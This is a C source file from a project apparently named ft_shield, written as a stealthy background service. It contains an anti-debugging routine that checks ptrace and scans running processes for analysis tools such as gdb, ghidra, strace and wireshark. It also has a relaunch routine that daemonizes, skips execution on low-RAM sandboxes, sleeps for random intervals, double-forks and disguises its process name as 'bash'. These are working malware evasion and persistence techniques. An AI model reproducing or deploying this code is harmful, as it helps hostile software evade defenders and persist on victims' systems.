#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/sysinfo.h>
#include <string.h>
#include <dirent.h>
#include <sys/ptrace.h>
#include <time.h>

#include "ft_shield.h"
#include "logger.h"

int detect_debugging()
{
    const char *analysis_tools[] = {
        "/gdb", "/lldb", "/vim", "/ghidra", "/ida", "/strace",
        "/ltrace", "/radare2", "/objdump", "/readelf", "/nm", "/strings",
        "/file", "/xxd", "/od", "/hexdump", "/tcpdump", "/wireshark",
        NULL};

    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1)
    {
        log_to_file("Debugger detected");
        return 1;
    }

    if (getenv("GDB") != NULL || getenv("DBUS_SESSION_BUS_ADDRESS") != NULL)
    {
        log_to_file("Debugger environment detected");
        return 1;
    }

    DIR *dir;
    struct dirent *ent;
    if ((dir = opendir("/proc")) != NULL)
    {
        while ((ent = readdir(dir)) != NULL)
        {
            if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
                continue;
            char path[CHAR_BUFFER];
            snprintf(path, sizeof(path), "/proc/%s/exe", ent->d_name);
            char linkpath[256];
            ssize_t len = readlink(path, linkpath, sizeof(linkpath) - 1);
            if (len != -1)
            {
                linkpath[len] = '\0';
                for (const char **tool = analysis_tools; *tool != NULL; tool++)
                {
                    if (strstr(linkpath, *tool) != NULL)
                    {
                        closedir(dir);
                        log_to_file("Analysis tool detected: %s", *tool);
                        return 1;
                    }
                }
            }
        }
        closedir(dir);
    }

    log_to_file("No debugging detected");
    return 0;
}

void fork_and_relaunch()
{
    log_to_file("Forking and relaunching...");

    srand(time(NULL));
    daemonize();

    struct sysinfo sys_info;
    sysinfo(&sys_info);

    if (sys_info.totalram < (512 * 1024 * 1024))
    {
        log_to_file("Low RAM detected, avoiding execution.");
        exit(EXIT_FAILURE);
    }

    for (int attempt = 0; attempt < ATTEMPTS; attempt++)
    {
        pid_t pid;
        sleep(rand() % 45 + 15);

        pid = fork();
        if (pid < 0)
        {
            log_to_file("Fork failed, retrying...");
            sleep(60);
        }
        else if (pid == 0)
        {
            if (fork() > 0)
                exit(0);

            setsid();

            prctl(PR_SET_NAME, "bash", 0, 0, 0);

            execl(BIN_LOCATION, SERVICE_NAME, NULL);

            log_to_file("Relaunch failed");
            exit(EXIT_FAILURE);
        }
        else
        {
            waitpid(pid, NULL, 0);
            log_to_file("Relaunch attempt %d/%d", attempt + 1, ATTEMPTS);
        }
    }

    log_to_file("Failed to relaunch after all attempts.");
    exit(EXIT_FAILURE);
}
